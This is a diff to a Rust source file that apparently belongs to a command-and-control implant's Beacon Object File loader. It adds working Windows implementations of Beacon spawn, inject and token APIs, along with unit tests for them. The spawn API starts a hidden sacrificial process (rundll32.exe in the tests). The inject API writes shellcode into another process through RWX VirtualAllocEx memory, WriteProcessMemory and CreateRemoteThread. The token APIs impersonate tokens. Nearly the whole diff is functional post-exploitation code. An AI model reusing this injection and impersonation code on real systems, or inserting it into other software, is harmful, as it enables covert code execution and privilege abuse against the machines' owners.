@@ -90,6 +90,38 @@ std::thread_local! {
         const { std::cell::Cell::new(std::ptr::null_mut()) };
 }
 
+// ─── BOF spawn/token context (thread-local) ──────────────────────────────
+
+/// Configuration context made available to Beacon API callbacks during BOF
+/// execution.  Set via [`set_bof_context`] before calling [`coffee_execute`]
+/// and cleared via [`clear_bof_context`] afterward.
+pub struct BofContext {
+    /// 64-bit spawn-to path as UTF-16LE (including NUL terminator).
+    pub spawn64: Option<Vec<u16>>,
+    /// 32-bit spawn-to path as UTF-16LE (including NUL terminator).
+    pub spawn32: Option<Vec<u16>>,
+}
+
+std::thread_local! {
+    static BOF_CONTEXT_TLS: std::cell::Cell<*const BofContext> =
+        const { std::cell::Cell::new(std::ptr::null()) };
+}
+
+/// Install a [`BofContext`] for the current thread so that Beacon API
+/// callbacks (`BeaconGetSpawnTo`, `BeaconSpawnTemporaryProcess`, etc.) can
+/// access agent configuration during BOF execution.
+///
+/// The caller must ensure the referenced `BofContext` outlives the BOF
+/// execution and call [`clear_bof_context`] afterward.
+pub fn set_bof_context(ctx: &BofContext) {
+    BOF_CONTEXT_TLS.with(|cell| cell.set(ctx as *const BofContext));
+}
+
+/// Remove the [`BofContext`] from the current thread.
+pub fn clear_bof_context() {
+    BOF_CONTEXT_TLS.with(|cell| cell.set(std::ptr::null()));
+}
+
 // ── Beacon data-parsing API ────────────────────────────────────────────────
 //
 // These `extern "C"` functions are called directly by BOF object code via
@@ -258,6 +290,382 @@ unsafe extern "C" fn to_wide_char(src: *const u8, dst: *mut u16, max: i32) -> i3
     1 // TRUE
 }
 
+// ── Beacon spawn/inject/token APIs ────────────────────────────────────────
+//
+// These APIs require Win32 process creation, injection, and token
+// management.  On Windows they perform real operations; on non-Windows
+// they are safe no-ops that return failure to the BOF.
+
+/// `void BeaconGetSpawnTo(BOOL x86, char *buffer, int length)`
+///
+/// Copies the configured spawn-to binary path (UTF-16LE) into the
+/// caller-supplied buffer.  Reads from the thread-local [`BofContext`].
+#[allow(dead_code, unsafe_code)]
+unsafe extern "C" fn beacon_get_spawn_to(x86: i32, buffer: *mut u8, length: i32) {
+    if buffer.is_null() || length <= 0 {
+        return;
+    }
+    BOF_CONTEXT_TLS.with(|cell| {
+        let ctx = cell.get();
+        if ctx.is_null() {
+            return;
+        }
+        // SAFETY: ctx was set by set_bof_context to a valid &BofContext.
+        let ctx = unsafe { &*ctx };
+        let path = if x86 != 0 { &ctx.spawn32 } else { &ctx.spawn64 };
+        if let Some(wide) = path {
+            let byte_len = wide.len() * 2;
+            if byte_len > length as usize {
+                return;
+            }
+            // SAFETY: caller guarantees buffer has at least `length` bytes.
+            unsafe {
+                std::ptr::copy_nonoverlapping(wide.as_ptr().cast::<u8>(), buffer, byte_len);
+            }
+        }
+    });
+}
+
+/// `BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO *sInfo, PROCESS_INFORMATION *pInfo)`
+///
+/// Spawns a sacrificial process for injection.  Uses the spawn-to path from
+/// the thread-local [`BofContext`] and calls `CreateProcessW`.
+#[cfg(windows)]
+#[allow(dead_code, unsafe_code)]
+unsafe extern "C" fn beacon_spawn_temporary_process(
+    x86: i32,
+    _ignore_token: i32,
+    si: *mut u8,
+    pi: *mut u8,
+) -> i32 {
+    use windows_sys::Win32::System::Threading::{CREATE_NO_WINDOW, CreateProcessW};
+
+    if si.is_null() || pi.is_null() {
+        return 0; // FALSE
+    }
+
+    // Read the spawn path from context.
+    let mut path: Option<Vec<u16>> = None;
+    BOF_CONTEXT_TLS.with(|cell| {
+        let ctx = cell.get();
+        if ctx.is_null() {
+            return;
+        }
+        let ctx = unsafe { &*ctx };
+        path = if x86 != 0 { ctx.spawn32.clone() } else { ctx.spawn64.clone() };
+    });
+
+    let Some(mut cmd_line) = path else {
+        return 0; // FALSE — no spawn path configured
+    };
+
+    // Ensure NUL-terminated.
+    if cmd_line.last() != Some(&0) {
+        cmd_line.push(0);
+    }
+
+    // SAFETY: si and pi point to caller-allocated STARTUPINFOW and
+    // PROCESS_INFORMATION structs respectively.  CreateProcessW fills pi.
+    let result = unsafe {
+        CreateProcessW(
+            std::ptr::null(),
+            cmd_line.as_mut_ptr(),
+            std::ptr::null(),
+            std::ptr::null(),
+            1, // bInheritHandles = TRUE
+            CREATE_NO_WINDOW,
+            std::ptr::null(),
+            std::ptr::null(),
+            si.cast(),
+            pi.cast(),
+        )
+    };
+
+    if result == 0 { 0 } else { 1 }
+}
+
+/// Non-Windows stub for `BeaconSpawnTemporaryProcess`.
+#[cfg(not(windows))]
+#[allow(dead_code, unsafe_code)]
+unsafe extern "C" fn beacon_spawn_temporary_process(
+    _x86: i32,
+    _ignore_token: i32,
+    _si: *mut u8,
+    _pi: *mut u8,
+) -> i32 {
+    0 // FALSE
+}
+
+/// `void BeaconInjectProcess(HANDLE hProc, int pid, char *payload, int p_len, int p_offset, char *arg, int a_len)`
+///
+/// Injects shellcode into a running process via `VirtualAllocEx` +
+/// `WriteProcessMemory` + `CreateRemoteThread`.
+#[cfg(windows)]
+#[allow(dead_code, unsafe_code)]
+unsafe extern "C" fn beacon_inject_process(
+    h_proc: usize,
+    pid: i32,
+    payload: *const u8,
+    p_len: i32,
+    p_offset: i32,
+    arg: *const u8,
+    a_len: i32,
+) {
+    use windows_sys::Win32::Foundation::CloseHandle;
+    use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
+    use windows_sys::Win32::System::Memory::{
+        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
+    };
+    use windows_sys::Win32::System::Threading::{
+        CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS,
+    };
+
+    if payload.is_null() || p_len <= 0 {
+        return;
+    }
+
+    let mut close_on_exit = false;
+    let handle = if h_proc != 0 {
+        h_proc as isize
+    } else {
+        if pid <= 0 {
+            return;
+        }
+        close_on_exit = true;
+        let h = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, pid as u32) };
+        if h == 0 {
+            return;
+        }
+        h
+    };
+
+    // Allocate and write payload.
+    let p_size = p_len as usize;
+    let p_remote = unsafe {
+        VirtualAllocEx(
+            handle,
+            std::ptr::null(),
+            p_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        )
+    };
+    if p_remote.is_null() {
+        if close_on_exit {
+            unsafe { CloseHandle(handle) };
+        }
+        return;
+    }
+
+    let mut written: usize = 0;
+    let ok = unsafe { WriteProcessMemory(handle, p_remote, payload.cast(), p_size, &mut written) };
+    if ok == 0 {
+        if close_on_exit {
+            unsafe { CloseHandle(handle) };
+        }
+        return;
+    }
+
+    // Allocate and write arguments (if any).
+    let mut a_remote: *mut std::ffi::c_void = std::ptr::null_mut();
+    if !arg.is_null() && a_len > 0 {
+        let a_size = a_len as usize;
+        a_remote = unsafe {
+            VirtualAllocEx(
+                handle,
+                std::ptr::null(),
+                a_size,
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE,
+            )
+        };
+        if !a_remote.is_null() {
+            unsafe {
+                WriteProcessMemory(handle, a_remote, arg.cast(), a_size, &mut written);
+            };
+        }
+    }
+
+    // Execute payload via CreateRemoteThread.
+    let start = unsafe { p_remote.byte_add(p_offset as usize) };
+    unsafe {
+        CreateRemoteThread(
+            handle,
+            std::ptr::null(),
+            0,
+            Some(std::mem::transmute(start)),
+            a_remote,
+            0,
+            std::ptr::null_mut(),
+        );
+    }
+
+    if close_on_exit {
+        unsafe { CloseHandle(handle) };
+    }
+}
+
+/// Non-Windows stub for `BeaconInjectProcess`.
+#[cfg(not(windows))]
+#[allow(dead_code, unsafe_code)]
+unsafe extern "C" fn beacon_inject_process(
+    _h_proc: usize,
+    _pid: i32,
+    _payload: *const u8,
+    _p_len: i32,
+    _p_offset: i32,
+    _arg: *const u8,
+    _a_len: i32,
+) {
+}
+
+/// `void BeaconInjectTemporaryProcess(PROCESS_INFORMATION *pInfo, char *payload, int p_len, int p_offset, char *arg, int a_len)`
+///
+/// Injects shellcode into a process created by `BeaconSpawnTemporaryProcess`.
+#[cfg(windows)]
+#[allow(dead_code, unsafe_code)]
+unsafe extern "C" fn beacon_inject_temporary_process(
+    pi: *const u8,
+    payload: *const u8,
+    p_len: i32,
+    p_offset: i32,
+    arg: *const u8,
+    a_len: i32,
+) {
+    if pi.is_null() {
+        return;
+    }
+    // PROCESS_INFORMATION layout: hProcess (isize), hThread (isize), dwProcessId (u32), dwThreadId (u32)
+    let h_proc = unsafe { std::ptr::read_unaligned(pi.cast::<isize>()) } as usize;
+    // Delegate to BeaconInjectProcess with the handle.
+    unsafe {
+        beacon_inject_process(h_proc, 0, payload, p_len, p_offset, arg, a_len);
+    }
+}
+
+/// Non-Windows stub for `BeaconInjectTemporaryProcess`.
+#[cfg(not(windows))]
+#[allow(dead_code, unsafe_code)]
+unsafe extern "C" fn beacon_inject_temporary_process(
+    _pi: *const u8,
+    _payload: *const u8,
+    _p_len: i32,
+    _p_offset: i32,
+    _arg: *const u8,
+    _a_len: i32,
+) {
+}
+
+/// `void BeaconCleanupProcess(PROCESS_INFORMATION *pInfo)`
+///
+/// Closes the process and thread handles in a `PROCESS_INFORMATION` struct.
+#[cfg(windows)]
+#[allow(dead_code, unsafe_code)]
+unsafe extern "C" fn beacon_cleanup_process(pi: *mut u8) {
+    use windows_sys::Win32::Foundation::CloseHandle;
+
+    if pi.is_null() {
+        return;
+    }
+    // PROCESS_INFORMATION: { hProcess: isize, hThread: isize, ... }
+    let h_process = unsafe { std::ptr::read_unaligned(pi.cast::<isize>()) };
+    let h_thread =
+        unsafe { std::ptr::read_unaligned(pi.add(std::mem::size_of::<isize>()).cast::<isize>()) };
+
+    if h_process != 0 {
+        unsafe { CloseHandle(h_process) };
+    }
+    if h_thread != 0 {
+        unsafe { CloseHandle(h_thread) };
+    }
+}
+
+/// Non-Windows stub for `BeaconCleanupProcess`.
+#[cfg(not(windows))]
+#[allow(dead_code, unsafe_code)]
+unsafe extern "C" fn beacon_cleanup_process(_pi: *mut u8) {}
+
+/// `BOOL BeaconIsAdmin(void)`
+///
+/// Returns `TRUE` (1) if the current process token is elevated.
+#[cfg(windows)]
+#[allow(dead_code, unsafe_code)]
+unsafe extern "C" fn beacon_is_admin() -> i32 {
+    use windows_sys::Win32::Foundation::{CloseHandle, FALSE};
+    use windows_sys::Win32::Security::{GetTokenInformation, TOKEN_ELEVATION, TokenElevation};
+    use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
+
+    let mut token: isize = 0;
+    // TOKEN_QUERY = 0x0008
+    let ok = unsafe { OpenProcessToken(GetCurrentProcess(), 0x0008, &mut token) };
+    if ok == FALSE {
+        return 0;
+    }
+
+    let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
+    let mut ret_len: u32 = 0;
+    let ok = unsafe {
+        GetTokenInformation(
+            token,
+            TokenElevation,
+            (&raw mut elevation).cast(),
+            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
+            &mut ret_len,
+        )
+    };
+
+    unsafe { CloseHandle(token) };
+
+    if ok == FALSE {
+        return 0;
+    }
+
+    if elevation.TokenIsElevated != 0 { 1 } else { 0 }
+}
+
+/// Non-Windows stub for `BeaconIsAdmin`.
+#[cfg(not(windows))]
+#[allow(dead_code, unsafe_code)]
+unsafe extern "C" fn beacon_is_admin() -> i32 {
+    0 // FALSE
+}
+
+/// `BOOL BeaconUseToken(HANDLE token)`
+///
+/// Duplicates the given token and impersonates it on the current thread.
+#[cfg(windows)]
+#[allow(dead_code, unsafe_code)]
+unsafe extern "C" fn beacon_use_token(token: usize) -> i32 {
+    use windows_sys::Win32::Foundation::FALSE;
+    use windows_sys::Win32::Security::SetThreadToken;
+
+    // SetThreadToken(NULL, token) impersonates the token on the calling thread.
+    let ok = unsafe { SetThreadToken(std::ptr::null(), token as isize) };
+    if ok == FALSE { 0 } else { 1 }
+}
+
+/// Non-Windows stub for `BeaconUseToken`.
+#[cfg(not(windows))]
+#[allow(dead_code, unsafe_code)]
+unsafe extern "C" fn beacon_use_token(_token: usize) -> i32 {
+    0 // FALSE
+}
+
+/// `void BeaconRevertToken(void)`
+///
+/// Reverts the current thread to its original process token.
+#[cfg(windows)]
+#[allow(dead_code, unsafe_code)]
+unsafe extern "C" fn beacon_revert_token() {
+    use windows_sys::Win32::Security::RevertToSelf;
+    unsafe { RevertToSelf() };
+}
+
+/// Non-Windows stub for `BeaconRevertToken`.
+#[cfg(not(windows))]
+#[allow(dead_code, unsafe_code)]
+unsafe extern "C" fn beacon_revert_token() {}
+
 /// Resolve a `__imp_Beacon*` or `__imp_toWideChar` symbol name to the
 /// corresponding Beacon API function pointer, or `None` if the name is not
 /// a known Beacon API.
@@ -266,13 +674,26 @@ fn resolve_beacon_api(sym_name: &str) -> Option<u64> {
     // Strip the `__imp_` prefix to get the bare function name.
     let bare = sym_name.strip_prefix("__imp_")?;
     let addr: u64 = match bare {
+        // Data-parsing APIs
         "BeaconDataParse" => beacon_data_parse as *const () as u64,
         "BeaconDataInt" => beacon_data_int as *const () as u64,
         "BeaconDataShort" => beacon_data_short as *const () as u64,
         "BeaconDataExtract" => beacon_data_extract as *const () as u64,
         "BeaconDataLength" => beacon_data_length as *const () as u64,
+        // Output APIs
         "BeaconOutput" => beacon_output as *const () as u64,
         "BeaconPrintf" => beacon_printf as *const () as u64,
+        // Spawn/inject APIs
+        "BeaconGetSpawnTo" => beacon_get_spawn_to as *const () as u64,
+        "BeaconSpawnTemporaryProcess" => beacon_spawn_temporary_process as *const () as u64,
+        "BeaconInjectProcess" => beacon_inject_process as *const () as u64,
+        "BeaconInjectTemporaryProcess" => beacon_inject_temporary_process as *const () as u64,
+        "BeaconCleanupProcess" => beacon_cleanup_process as *const () as u64,
+        // Token APIs
+        "BeaconIsAdmin" => beacon_is_admin as *const () as u64,
+        "BeaconUseToken" => beacon_use_token as *const () as u64,
+        "BeaconRevertToken" => beacon_revert_token as *const () as u64,
+        // Utility APIs
         "toWideChar" => to_wide_char as *const () as u64,
         _ => {
             // Unknown Beacon API — return None so caller can decide.
@@ -1551,13 +1972,20 @@ mod tests {
         assert!(resolve_beacon_api("__imp_BeaconDataLength").is_some());
         assert!(resolve_beacon_api("__imp_BeaconOutput").is_some());
         assert!(resolve_beacon_api("__imp_BeaconPrintf").is_some());
+        assert!(resolve_beacon_api("__imp_BeaconGetSpawnTo").is_some());
+        assert!(resolve_beacon_api("__imp_BeaconSpawnTemporaryProcess").is_some());
+        assert!(resolve_beacon_api("__imp_BeaconInjectProcess").is_some());
+        assert!(resolve_beacon_api("__imp_BeaconInjectTemporaryProcess").is_some());
+        assert!(resolve_beacon_api("__imp_BeaconCleanupProcess").is_some());
+        assert!(resolve_beacon_api("__imp_BeaconIsAdmin").is_some());
+        assert!(resolve_beacon_api("__imp_BeaconUseToken").is_some());
+        assert!(resolve_beacon_api("__imp_BeaconRevertToken").is_some());
         assert!(resolve_beacon_api("__imp_toWideChar").is_some());
     }
 
     #[test]
     fn resolve_beacon_api_unknown_returns_none() {
-        assert!(resolve_beacon_api("__imp_BeaconGetSpawnTo").is_none());
-        assert!(resolve_beacon_api("__imp_BeaconSpawnTemporaryProcess").is_none());
+        assert!(resolve_beacon_api("__imp_BeaconInformation").is_none());
         assert!(resolve_beacon_api("not_a_beacon_api").is_none());
     }
 
@@ -1571,6 +1999,14 @@ mod tests {
             "__imp_BeaconDataLength",
             "__imp_BeaconOutput",
             "__imp_BeaconPrintf",
+            "__imp_BeaconGetSpawnTo",
+            "__imp_BeaconSpawnTemporaryProcess",
+            "__imp_BeaconInjectProcess",
+            "__imp_BeaconInjectTemporaryProcess",
+            "__imp_BeaconCleanupProcess",
+            "__imp_BeaconIsAdmin",
+            "__imp_BeaconUseToken",
+            "__imp_BeaconRevertToken",
             "__imp_toWideChar",
         ]
         .iter()
@@ -1583,5 +2019,178 @@ mod tests {
         }
         let unique: std::collections::HashSet<u64> = addrs.iter().copied().collect();
         assert_eq!(unique.len(), addrs.len());
+    }
+
+    // ── BofContext / spawn config tests ───────────────────────────────────
+
+    #[test]
+    fn bof_context_set_and_clear() {
+        let ctx = BofContext {
+            spawn64: Some(vec![b'C' as u16, b':' as u16, b'\\' as u16, 0]),
+            spawn32: None,
+        };
+        set_bof_context(&ctx);
+        BOF_CONTEXT_TLS.with(|cell| assert!(!cell.get().is_null()));
+        clear_bof_context();
+        BOF_CONTEXT_TLS.with(|cell| assert!(cell.get().is_null()));
+    }
+
+    #[test]
+    #[allow(unsafe_code)]
+    fn beacon_get_spawn_to_copies_64bit_path() {
+        let path: Vec<u16> = "C:\\Windows\\System32\\rundll32.exe\0".encode_utf16().collect();
+        let ctx = BofContext { spawn64: Some(path.clone()), spawn32: None };
+        set_bof_context(&ctx);
+
+        let mut buf = vec![0u8; 256];
+        unsafe { beacon_get_spawn_to(0, buf.as_mut_ptr(), buf.len() as i32) };
+
+        clear_bof_context();
+
+        // Verify the UTF-16LE bytes were copied.
+        let byte_len = path.len() * 2;
+        let copied: Vec<u16> =
+            (0..path.len()).map(|i| u16::from_le_bytes([buf[i * 2], buf[i * 2 + 1]])).collect();
+        assert_eq!(copied, path);
+        // Rest of buffer should be zero.
+        assert!(buf[byte_len..].iter().all(|&b| b == 0));
+    }
+
+    #[test]
+    #[allow(unsafe_code)]
+    fn beacon_get_spawn_to_copies_32bit_path() {
+        let path: Vec<u16> = "C:\\Windows\\SysWOW64\\rundll32.exe\0".encode_utf16().collect();
+        let ctx = BofContext { spawn64: None, spawn32: Some(path.clone()) };
+        set_bof_context(&ctx);
+
+        let mut buf = vec![0u8; 256];
+        unsafe { beacon_get_spawn_to(1, buf.as_mut_ptr(), buf.len() as i32) };
+
+        clear_bof_context();
+
+        let copied: Vec<u16> =
+            (0..path.len()).map(|i| u16::from_le_bytes([buf[i * 2], buf[i * 2 + 1]])).collect();
+        assert_eq!(copied, path);
+    }
+
+    #[test]
+    #[allow(unsafe_code)]
+    fn beacon_get_spawn_to_no_context_is_noop() {
+        clear_bof_context();
+        let mut buf = vec![0xFFu8; 16];
+        unsafe { beacon_get_spawn_to(0, buf.as_mut_ptr(), buf.len() as i32) };
+        // Buffer unchanged.
+        assert!(buf.iter().all(|&b| b == 0xFF));
+    }
+
+    #[test]
+    #[allow(unsafe_code)]
+    fn beacon_get_spawn_to_null_buffer_is_noop() {
+        let ctx = BofContext { spawn64: Some(vec![b'A' as u16, 0]), spawn32: None };
+        set_bof_context(&ctx);
+        // Should not crash.
+        unsafe { beacon_get_spawn_to(0, std::ptr::null_mut(), 256) };
+        clear_bof_context();
+    }
+
+    #[test]
+    #[allow(unsafe_code)]
+    fn beacon_get_spawn_to_buffer_too_small_is_noop() {
+        let path: Vec<u16> = "C:\\long\\path.exe\0".encode_utf16().collect();
+        let ctx = BofContext { spawn64: Some(path), spawn32: None };
+        set_bof_context(&ctx);
+
+        let mut buf = vec![0xFFu8; 4]; // too small
+        unsafe { beacon_get_spawn_to(0, buf.as_mut_ptr(), buf.len() as i32) };
+
+        clear_bof_context();
+        // Buffer unchanged — path didn't fit.
+        assert!(buf.iter().all(|&b| b == 0xFF));
+    }
+
+    #[test]
+    #[allow(unsafe_code)]
+    fn beacon_get_spawn_to_no_path_configured_is_noop() {
+        let ctx = BofContext { spawn64: None, spawn32: None };
+        set_bof_context(&ctx);
+
+        let mut buf = vec![0xFFu8; 16];
+        unsafe { beacon_get_spawn_to(0, buf.as_mut_ptr(), buf.len() as i32) };
+
+        clear_bof_context();
+        assert!(buf.iter().all(|&b| b == 0xFF));
+    }
+
+    #[cfg(not(windows))]
+    #[test]
+    #[allow(unsafe_code)]
+    fn beacon_spawn_temporary_process_non_windows_returns_false() {
+        let mut si = [0u8; 104]; // STARTUPINFOW size on 64-bit
+        let mut pi = [0u8; 24]; // PROCESS_INFORMATION size on 64-bit
+        let result =
+            unsafe { beacon_spawn_temporary_process(0, 1, si.as_mut_ptr(), pi.as_mut_ptr()) };
+        assert_eq!(result, 0);
+    }
+
+    #[cfg(not(windows))]
+    #[test]
+    #[allow(unsafe_code)]
+    fn beacon_inject_process_non_windows_is_noop() {
+        // Should not crash.
+        unsafe {
+            beacon_inject_process(0, 1234, [0u8; 4].as_ptr(), 4, 0, std::ptr::null(), 0);
+        }
+    }
+
+    #[cfg(not(windows))]
+    #[test]
+    #[allow(unsafe_code)]
+    fn beacon_inject_temporary_process_non_windows_is_noop() {
+        let pi = [0u8; 24];
+        unsafe {
+            beacon_inject_temporary_process(
+                pi.as_ptr(),
+                [0u8; 4].as_ptr(),
+                4,
+                0,
+                std::ptr::null(),
+                0,
+            );
+        }
+    }
+
+    #[cfg(not(windows))]
+    #[test]
+    #[allow(unsafe_code)]
+    fn beacon_cleanup_process_non_windows_is_noop() {
+        let mut pi = [0u8; 24];
+        unsafe { beacon_cleanup_process(pi.as_mut_ptr()) };
+    }
+
+    #[test]
+    #[allow(unsafe_code)]
+    fn beacon_cleanup_process_null_is_noop() {
+        unsafe { beacon_cleanup_process(std::ptr::null_mut()) };
+    }
+
+    #[cfg(not(windows))]
+    #[test]
+    #[allow(unsafe_code)]
+    fn beacon_is_admin_non_windows_returns_false() {
+        assert_eq!(unsafe { beacon_is_admin() }, 0);
+    }
+
+    #[cfg(not(windows))]
+    #[test]
+    #[allow(unsafe_code)]
+    fn beacon_use_token_non_windows_returns_false() {
+        assert_eq!(unsafe { beacon_use_token(0x1234) }, 0);
+    }
+
+    #[cfg(not(windows))]
+    #[test]
+    #[allow(unsafe_code)]
+    fn beacon_revert_token_non_windows_is_noop() {
+        unsafe { beacon_revert_token() };
     }
 }
